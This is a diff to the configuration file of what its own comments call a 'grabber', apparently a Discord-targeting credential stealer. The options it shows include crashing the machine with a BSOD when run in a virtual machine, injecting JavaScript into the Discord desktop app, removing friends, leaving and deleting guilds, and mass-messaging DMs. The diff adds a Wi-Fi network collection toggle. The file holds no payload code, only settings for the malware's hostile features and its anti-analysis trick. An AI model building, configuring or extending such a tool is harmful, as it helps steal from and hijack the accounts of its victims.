@@ -15,6 +15,7 @@ module.exports = {
   // If the user runs the grabber from a virtual machine, should a BSOD be triggered?
   bsodIfVm: true,
   fakeError: false,
+  wifiNetworks: false,
   discord: {
     // Inject JavaScript into the Discord desktop app
     injectJs: false,
@@ -30,8 +31,7 @@ module.exports = {
       removeAllFriends: false,
       leaveAllGuilds: false,
       deleteAllOwnedGuilds: false,
-      sendMessageToAllDMs: 'w',
-      
+      sendMessageToAllDMs: false
     }
   }
 };
